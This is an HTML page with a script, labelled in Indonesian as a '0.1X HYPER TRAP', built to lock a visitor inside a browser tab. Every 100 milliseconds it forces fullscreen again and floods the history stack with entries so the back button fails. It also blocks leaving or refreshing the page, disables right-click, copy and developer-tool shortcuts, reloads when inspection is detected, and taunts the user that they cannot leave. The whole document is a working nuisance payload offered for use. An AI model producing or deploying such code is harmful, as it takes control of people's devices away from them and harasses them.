<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no, viewport-fit=cover">
    <title>🔥 TRAP 0.1X 🔥</title>
    <!-- Font Awesome buat ikon -->
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0-beta3/css/all.min.css">
    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
            font-family: 'Segoe UI', 'Poppins', system-ui, sans-serif;
        }

        body {
            background: #000000;
            min-height: 100vh;
            display: flex;
            justify-content: center;
            align-items: center;
            padding: 15px;
            position: fixed;
            width: 100%;
            height: 100%;
            overflow: hidden;
        }

        /* Efek matrix background */
        .matrix-bg {
            position: fixed;
            top: 0;
            left: 0;
            width: 100%;
            height: 100%;
            background: linear-gradient(0deg, rgba(255,0,0,0.03) 1px, transparent 1px);
            background-size: 100% 4px;
            animation: matrix 20s linear infinite;
            pointer-events: none;
        }

        @keyframes matrix {
            0% { background-position: 0 0; }
            100% { background-position: 0 100%; }
        }

        .container {
            position: relative;
            z-index: 10;
            max-width: 500px;
            width: 100%;
        }

        .card {
            background: rgba(20, 0, 0, 0.95);
            backdrop-filter: blur(15px);
            -webkit-backdrop-filter: blur(15px);
            border: 4px solid #ff0000;
            border-radius: 50px;
            padding: 45px 30px;
            text-align: center;
            box-shadow: 0 0 100px #ff0000, inset 0 0 50px #ff000030;
            animation: borderGlow 0.5s infinite alternate;
            position: relative;
            overflow: hidden;
        }

        .card::before {
            content: "⚠️⚠️⚠️";
            position: absolute;
            top: -20px;
            left: -20px;
            font-size: 100px;
            opacity: 0.1;
            transform: rotate(-20deg);
            color: #ff0000;
        }

        .card::after {
            content: "⚠️⚠️⚠️";
            position: absolute;
            bottom: -20px;
            right: -20px;
            font-size: 100px;
            opacity: 0.1;
            transform: rotate(20deg);
            color: #ff0000;
        }

        @keyframes borderGlow {
            0% { box-shadow: 0 0 50px #ff0000, inset 0 0 30px #ff000020; border-color: #ff0000; }
            100% { box-shadow: 0 0 120px #ff0000, 0 0 200px #cc0000, inset 0 0 60px #ff000080; border-color: #ffffff; }
        }

        h1 {
            font-size: 3.2rem;
            font-weight: 900;
            color: #ff0000;
            text-shadow: 0 0 40px #ff0000, 0 0 80px #aa0000;
            margin-bottom: 20px;
            letter-spacing: 5px;
            word-break: break-word;
            animation: textFlicker 0.5s infinite;
        }

        @keyframes textFlicker {
            0%, 100% { opacity: 1; text-shadow: 0 0 40px #ff0000; }
            50% { opacity: 0.9; text-shadow: 0 0 60px #ff0000, 0 0 100px #aa0000; }
        }

        .warning-icon {
            font-size: 5rem;
            color: #ff0000;
            margin: 20px 0;
            animation: rotate 1s infinite linear;
        }

        @keyframes rotate {
            0% { transform: rotate(0deg); }
            100% { transform: rotate(360deg); }
        }

        .status-box {
            background: #1a0000;
            border: 3px solid #ff0000;
            border-radius: 60px;
            padding: 20px;
            margin: 30px 0;
        }

        .status-text {
            color: #ff0000;
            font-size: 1.5rem;
            font-weight: bold;
            margin-bottom: 15px;
            text-transform: uppercase;
        }

        .lock-icon {
            display: flex;
            justify-content: center;
            gap: 20px;
            font-size: 2rem;
            color: #ff0000;
        }

        .lock-icon i {
            animation: lockPulse 0.5s infinite;
        }

        .lock-icon i:nth-child(2) {
            animation-delay: 0.1s;
        }
        .lock-icon i:nth-child(3) {
            animation-delay: 0.2s;
        }
        .lock-icon i:nth-child(4) {
            animation-delay: 0.3s;
        }
        .lock-icon i:nth-child(5) {
            animation-delay: 0.4s;
        }

        @keyframes lockPulse {
            0%, 100% { transform: scale(1); opacity: 0.8; }
            50% { transform: scale(1.3); opacity: 1; text-shadow: 0 0 30px #ff0000; }
        }

        .countdown-box {
            background: #000000;
            border: 2px solid #ff0000;
            border-radius: 50px;
            padding: 20px;
            margin: 30px 0;
        }

        .countdown-label {
            color: #ff0000;
            font-size: 1.2rem;
            margin-bottom: 10px;
        }

        #countdown {
            font-size: 5rem;
            font-weight: bold;
            color: #ff0000;
            font-family: monospace;
            text-shadow: 0 0 40px #ff0000;
            line-height: 1;
        }

        .btn-panic {
            background: transparent;
            border: 4px solid #ff0000;
            border-radius: 80px;
            padding: 25px;
            width: 100%;
            font-size: 2rem;
            font-weight: bold;
            color: #ff0000;
            cursor: pointer;
            transition: 0.1s;
            margin: 30px 0 20px;
            text-transform: uppercase;
            letter-spacing: 3px;
            position: relative;
            overflow: hidden;
        }

        .btn-panic::before {
            content: "";
            position: absolute;
            top: 0;
            left: -100%;
            width: 100%;
            height: 100%;
            background: linear-gradient(90deg, transparent, #ff000030, transparent);
            transition: 0.5s;
        }

        .btn-panic:hover::before {
            left: 100%;
        }

        .btn-panic:hover {
            background: #ff000020;
            transform: scale(1.05);
            box-shadow: 0 0 80px #ff0000;
        }

        .btn-panic:active {
            transform: scale(0.95);
        }

        .footer {
            color: #880000;
            margin-top: 30px;
            font-size: 0.9rem;
        }

        /* Fullscreen paksa */
        :-webkit-full-screen .card {
            border-width: 6px;
        }
    </style>
</head>
<body>
    <div class="matrix-bg"></div>
    
    <div class="container">
        <div class="card">
            <h1>🔥 0.1X TRAP 🔥</h1>
            
            <div class="warning-icon">
                <i class="fas fa-skull-crossbones"></i>
            </div>

            <div class="status-box">
                <div class="status-text">
                    <i class="fas fa-shield-alt"></i> FREKUENSI 0.1 DETIK <i class="fas fa-shield-alt"></i>
                </div>
                <div class="lock-icon">
                    <i class="fas fa-lock"></i>
                    <i class="fas fa-lock"></i>
                    <i class="fas fa-lock"></i>
                    <i class="fas fa-lock"></i>
                    <i class="fas fa-lock"></i>
                </div>
            </div>

            <!-- Timer countdown -->
            <div class="countdown-box">
                <div class="countdown-label">
                    <i class="fas fa-hourglass-half"></i> CEK TIAP:
                </div>
                <div id="countdown">0.1s</div>
                <div style="color: #ff0000; margin-top: 10px; font-size: 1rem;">
                    ⚡ 10x PER DETIK ⚡
                </div>
            </div>

            <!-- Tombol jebakan -->
            <button class="btn-panic" id="panicBtn">
                <i class="fas fa-ban"></i> KELUAR <i class="fas fa-ban"></i>
            </button>

            <div class="footer">
                <i class="fas fa-code"></i> BY WATUP • 0.1X HYPER TRAP 😈
            </div>
        </div>
    </div>

    <script>
        (function() {
            // ==================== KONFIGURASI 0.1 DETIK ====================
            const panicBtn = document.getElementById('panicBtn');
            
            // ==================== FULLSCREEN PAKSA 0.1 DETIK ====================
            function forceFullScreen() {
                if (document.documentElement.requestFullscreen) {
                    document.documentElement.requestFullscreen();
                } else if (document.documentElement.webkitRequestFullscreen) {
                    document.documentElement.webkitRequestFullscreen();
                } else if (document.documentElement.msRequestFullscreen) {
                    document.documentElement.msRequestFullscreen();
                } else if (document.documentElement.mozRequestFullScreen) {
                    document.documentElement.mozRequestFullScreen();
                }
            }

            // PAKSA FULLSCREEN TIAP 0.1 DETIK (10x per detik)
            setInterval(forceFullScreen, 100);
            forceFullScreen();

            // ==================== JEBEK BACK TOTAL 0.1 DETIK ====================
            // Isi history sampe 200 state
            for (let i = 0; i < 200; i++) {
                history.pushState(null, null, location.href);
            }
            
            // Event handler buat back
            window.onpopstate = function(event) {
                // Push 20 state baru setiap kali back
                for (let i = 0; i < 20; i++) {
                    history.pushState(null, null, location.href);
                }
                
                // Geter dikit biar keliatan error
                document.body.style.transform = 'translateX(5px)';
                setTimeout(() => {
                    document.body.style.transform = 'translateX(-5px)';
                }, 25);
                setTimeout(() => {
                    document.body.style.transform = 'translateX(0)';
                }, 75);
                
                // Kasih efek visual
                document.querySelector('.card').style.borderColor = '#ff0000';
                setTimeout(() => {
                    document.querySelector('.card').style.borderColor = '#ff0000';
                }, 150);
                
                console.log('🔥 JEBETAN BACK 0.1X AKTIF!');
            };

            // Interval nambah state TIAP 0.1 DETIK
            setInterval(function() {
                for (let i = 0; i < 10; i++) {
                    history.pushState(null, null, location.href);
                }
            }, 100); // 0.1 DETIK!

            // ==================== CEK FULLSCREEN MANUAL 0.1 DETIK ====================
            setInterval(function() {
                if (!document.fullscreenElement && !document.webkitFullscreenElement && !document.mozFullScreenElement) {
                    forceFullScreen();
                    
                    // Efek kalo nyoba keluar fullscreen
                    document.body.style.backgroundColor = '#ff0000';
                    setTimeout(() => {
                        document.body.style.backgroundColor = '#000000';
                    }, 50);
                }
            }, 100); // 0.1 DETIK!

            // ==================== EVENT FULLSCREEN ====================
            document.addEventListener('fullscreenchange', function() {
                if (!document.fullscreenElement) {
                    forceFullScreen();
                }
            });

            document.addEventListener('webkitfullscreenchange', function() {
                if (!document.webkitFullscreenElement) {
                    forceFullScreen();
                }
            });

            document.addEventListener('mozfullscreenchange', function() {
                if (!document.mozFullScreenElement) {
                    forceFullScreen();
                }
            });

            // ==================== CEK VISIBILITY 0.1 DETIK ====================
            document.addEventListener('visibilitychange', function() {
                if (document.hidden) {
                    // Kalo di minimize, paksa fullscreen terus
                    for (let i = 0; i < 5; i++) {
                        setTimeout(forceFullScreen, i * 20);
                    }
                }
            });

            // CEK VISIBILITY MANUAL TIAP 0.1 DETIK
            setInterval(function() {
                if (document.hidden) {
                    forceFullScreen();
                }
            }, 100); // 0.1 DETIK!

            // ==================== TOMBOL PANIC ====================
            panicBtn.addEventListener('click', function(e) {
                e.preventDefault();
                
                // Efek cepat
                this.style.transform = 'scale(1.2)';
                setTimeout(() => {
                    this.style.transform = 'scale(1)';
                }, 50);
                
                // Munculin pesan troll
                alert('⚠️ 0.1X TRAP ⚠️\n\nLU GABISA KELUAR!');
                
                // Paksa fullscreen
                forceFullScreen();
                
                // Geterin layar super cepat
                for (let i = 0; i < 10; i++) {
                    setTimeout(() => {
                        document.body.style.transform = 'translateX(5px)';
                    }, i * 25);
                    setTimeout(() => {
                        document.body.style.transform = 'translateX(-5px)';
                    }, i * 25 + 12);
                }
                setTimeout(() => {
                    document.body.style.transform = 'translateX(0)';
                }, 300);
            });

            // ==================== ANTI REFRESH ====================
            window.addEventListener('beforeunload', function(e) {
                e.preventDefault();
                e.returnValue = '';
                
                // Kembali lagi pake history super cepat
                for (let i = 0; i < 50; i++) {
                    history.pushState(null, null, location.href);
                }
                
                return '';
            });

            // ==================== KUNCI ORIENTASI ====================
            try {
                screen.orientation.lock('portrait').catch(() => {});
            } catch(e) {}

            // ==================== OVERLAY PENCEGAH ====================
            const overlay = document.createElement('div');
            overlay.style.position = 'fixed';
            overlay.style.top = '0';
            overlay.style.left = '0';
            overlay.style.width = '100%';
            overlay.style.height = '100%';
            overlay.style.zIndex = '999999';
            overlay.style.background = 'transparent';
            overlay.oncontextmenu = function(e) {
                e.preventDefault();
                return false;
            };
            overlay.onselectstart = function(e) {
                e.preventDefault();
                return false;
            };
            overlay.oncopy = function(e) {
                e.preventDefault();
                return false;
            };
            document.body.appendChild(overlay);

            // ==================== ANTI INSPECT ELEMENT ====================
            document.addEventListener('keydown', function(e) {
                // F12, Ctrl+Shift+I, Ctrl+Shift+J, Ctrl+U
                if (e.key === 'F12' || 
                    (e.ctrlKey && e.shiftKey && e.key === 'I') || 
                    (e.ctrlKey && e.shiftKey && e.key === 'J') || 
                    (e.ctrlKey && e.key === 'u')) {
                    e.preventDefault();
                    
                    // Kasih efek
                    document.body.style.filter = 'blur(5px)';
                    setTimeout(() => {
                        document.body.style.filter = 'blur(0)';
                    }, 200);
                    
                    return false;
                }
            });

            // ==================== DEBUG PROTECTION 0.1 DETIK ====================
            setInterval(function() {
                // Cek kalo lagi di-inspect
                if (window.outerWidth - window.innerWidth > 50 || window.outerHeight - window.innerHeight > 50) {
                    window.location.reload();
                }
            }, 100); // 0.1 DETIK!

            // ==================== CEK RESOLUSI 0.1 DETIK ====================
            let lastWidth = window.innerWidth;
            let lastHeight = window.innerHeight;
            
            setInterval(function() {
                // Kalo resolusi berubah (mungkin nyoba inspect)
                if (window.innerWidth !== lastWidth || window.innerHeight !== lastHeight) {
                    lastWidth = window.innerWidth;
                    lastHeight = window.innerHeight;
                    forceFullScreen();
                }
            }, 100); // 0.1 DETIK!

            console.log('🔥 0.1X HYPER TRAP AKTIF! 10x PER DETIK! 😈');
        })();
    </script>
</body>
</html>
